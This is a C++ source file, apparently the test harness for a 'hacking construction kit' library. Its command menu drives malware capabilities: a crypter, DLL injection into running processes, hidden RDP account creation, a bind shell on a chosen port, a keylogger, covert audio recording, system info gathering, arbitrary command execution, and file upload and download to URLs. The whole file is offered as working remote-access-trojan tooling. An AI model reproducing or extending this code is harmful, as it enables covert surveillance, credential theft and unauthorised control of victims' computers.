/*
 * Author: thirdstormofcythraul@outlook.com
 */
#ifdef _DEBUG
#define _CRTDBG_MAP_ALLOC
#include <stdlib.h>
#include <crtdbg.h>
#endif

#pragma warning(disable: 4996)

#include <stdio.h>
#include <cstdio>
#include <string>
#include <fstream>
#include <stdlib.h>
#include <iostream>

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <Winuser.h>

#include <keylogger.h>
#include <cprocess.h>
#include <macro.h>
#include <base64.h>
#include <ccrypter.h>
#include <check.h>
#include <cshell.h>
#include <file.h>
#include <http_helper.h>
#include <icmp.h>
#include <info.h>
#include <extern\RSA.h>
#include <sound_recorder.h>
#pragma comment(lib, "hacking construction kit.lib")

#include <memory_debug.h>

using namespace std;

int wmain(int argc, wchar_t* argv[])
{
#ifdef _DEBUG
	_CrtSetDbgFlag ( _CRTDBG_ALLOC_MEM_DF | _CRTDBG_LEAK_CHECK_DF );
#endif
	if (argc == 1){
		printf("Test hck library\n");
		printf("Encode base 64: a value\n");
		printf("Decode base 64: b value\n");
		printf("Crypter: c infile outfile\n");
		printf("Find open TCP port: d port\n");
		printf("Kill a process: e pid\n");
		printf("Inject dll: f path pid\n");
		printf("Inject dll with LoadLibrary: g FULLpath pid\n");
		printf("Add a RDP user: h username password\n");
		printf("Remove RDP user: i username\n");
		printf("Open a remote shell: j port\n");
		printf("Find files: k path filename\n");
		printf("Replace in a file: l infile outfile searched size replaced\n");
		printf("Send GET: m url\n");
		printf("Send POST: n server uri post\n");
		printf("Download: o uri filename\n");
		printf("Ping: p address\n");
		printf("Get all infos: q\n");
		printf("Start key logger: r filename\n");
		printf("Generate RSA keys: s digits\n");
		printf("Sound record: t filename time\n");
		printf("Execute a shell command: u cmd waitForResult\n");
		printf("list a path: v path\n");
		printf("upload a file: w file url\n");

		return 0;
	}
	wchar_t firstParam = *argv[1];
	if (firstParam == 'a'){
		wchar_t *value = argv[2];
		// Encode b64
		Base64 b64;
		size_t output;
		char * encoded = b64.encode((unsigned char *)value, wcslen(value) * sizeof(wchar_t), &output);

		char *buffer = new char[output + 1];
		buffer[output] = '\0';
		_snprintf(buffer, output, "%s", encoded);

		printf(buffer);

		delete buffer;
		delete encoded;

	} else if (firstParam == 'b'){
		// Decode b64
		wchar_t *value = argv[2];
		// Encode b64
		Base64 b64;
		size_t output;
		wchar_t * encoded = (wchar_t*)b64.decode(value, wcslen(value) * sizeof(wchar_t), &output);

		wchar_t *buffer = new wchar_t[output / sizeof(wchar_t) + 1];
		buffer[output / sizeof(wchar_t)] = '\0';
		_snwprintf(buffer, output / sizeof(wchar_t), L"%s", encoded);

		std::wcout << buffer;

		delete buffer;
		delete encoded;
	} else if (firstParam == 'c'){
		// Crypter
		wchar_t *infile = argv[2];
		wchar_t *outfile = argv[3];
		Crypter::evadeSandbox = false;
		Crypter::crypt(infile, outfile);
	} else if (firstParam == 'd'){
		// Find open port
		wchar_t *port = argv[2];
		char ip[20];
		if (Check::findHostPortOpen(ip, _wtoi(port))){
			printf("Found a port open on %s\n", ip);
		}
	} else if (firstParam == 'e'){
		// Kill process
		wchar_t *pid = argv[2];
		if (Process::killProcess(_wtoi(pid))){
			printf("Process killed\n");
		} else {
			printf("Unable to kill process\n");
		}
	} else if (firstParam == 'f'){
		// Inject dll
		wchar_t *path = argv[2];
		wchar_t *pid = argv[3];
		if (Process::injectDll(path, _wtoi(pid))){
			printf("Injection ok\n");
		}
	} else if (firstParam == 'g'){
		// Inject dll with LoadLibrary
		wchar_t *path = argv[2];
		wchar_t *pid = argv[3];
		if (Process::injectDllWithLoadLibrary(path, _wtoi(pid))){
			printf("Injection ok\n");
		}
	} else if (firstParam == 'h'){
		// Add rdp user
		wchar_t *username = argv[2];
		wchar_t *password = argv[3];
		Shell::addRdpUser(username, password);
	} else if (firstParam == 'i'){
		// Remove rdp user
		wchar_t *username = argv[2];
		Shell::removeRdpUser(username);
	} else if (firstParam == 'j'){
		// Open shell
		wchar_t *port = argv[2];
		Shell::openShell(_wtoi(port));
		Sleep(INFINITE);
	} else if (firstParam == 'k'){
		// Find files
		wchar_t *path = argv[2];
		wchar_t *filename = argv[3];
		vector<tstring> files;
		DWORD totalSize = 0;

		if (File::findFile(files, path, filename, totalSize)){
			for (vector<tstring>::iterator it = files.begin() ; it != files.end(); ++it){
				std::wcout << *it << std::endl;
			}
		}
	} else if (firstParam == 'l'){
		// Replace in a file
		wchar_t *infile = argv[2];
		wchar_t *outfile = argv[3];
		char *searched = wToc(argv[4]);
		wchar_t *size = argv[5];
		char *replace = wToc(argv[6]);
		if (File::replaceInFile(infile, outfile, searched, _wtoi(size), replace)){
			printf("String replaced\n");
		}
		delete[] searched;
		delete[] replace;

	} else if (firstParam == 'm'){
		// Send GET
		wchar_t *uri = argv[2];
		std::wcout << uri;
		HttpHelper helper;
		LPSTR *responses = helper.get(uri);
		LPSTR *response = responses;
		while(*response != 0){
			printf("%s", *response);
			delete[] *response;
			response++;
		}
		delete[] responses;
	} else if (firstParam == 'n'){
		// Send POST
		wchar_t *server = argv[2];
		wchar_t *uri = argv[3];
		wchar_t *post = argv[4];
		char *response;
		int size;
		HttpHelper helper;
		if (helper.sendPost(server, uri, post, &response, size)){
			//Print::printBuffer(response, size);
			delete response;
		}
	} else if (firstParam == 'o'){
		// Download
		wchar_t *uri = argv[2];
		wchar_t *filename = argv[3];
		HttpHelper helper;
		helper.download(uri, filename);
	} else if (firstParam == 'p'){
		// Ping
		char *ip = wToc(argv[2]);
		if (Icmp::ping(ip)){
			printf("Ping %s ok\n", ip);
		}
		delete[] ip;
	} else if (firstParam == 'q'){
		// Get all infos
		std::wcout << Info::getAllInfos();
	} else if (firstParam == 'r'){
		// Start key logger
		wchar_t *filename = argv[2];
		Keylogger::startKeylogger(filename);
		Sleep(INFINITE);
	} else if (firstParam == 's'){
		// Generate RSA key pairs
		wchar_t *digits = argv[2];
		KeyPair pair = RSA::GenerateKeyPair(_wtoi(digits));
		std::cout << pair << std::endl;
	} else if (firstParam == 't'){
		SoundRecorder sound;
		wchar_t *filename = argv[2];
		wchar_t *time = argv[3];
		// TODO: check
		if (sound.record(_wtoi(time), filename)){
			printf("Sound recorded ok\n");
		}
	} else if (firstParam == 'u'){
		wchar_t *cmd = argv[2];
		wchar_t *wait = argv[3];
		Shell::executeCmd(cmd, _wtoi(wait) == 0 ? false: true);

	} else if (firstParam == 'v'){
		wchar_t *path = argv[2];
		vector<tstring> files;
		vector<tstring> folders;
		File::listDirectory(path, files, folders);
		for (vector<tstring>::iterator it = files.begin() ; it != files.end(); ++it){
			std::wcout << *it << endl;
		}
		for (vector<tstring>::iterator it = folders.begin() ; it != folders.end(); ++it){
			std::wcout << *it << endl;
		}
	} else if (firstParam == 'w'){
		HttpHelper http;
		char *response;
		int size;
		http.uploadFile(argv[3], argv[2], L"upload", &response, size);
	} else {
		printf("Params not recognised\n");
	}
	//_CrtDumpMemoryLeaks();
	return 0;
}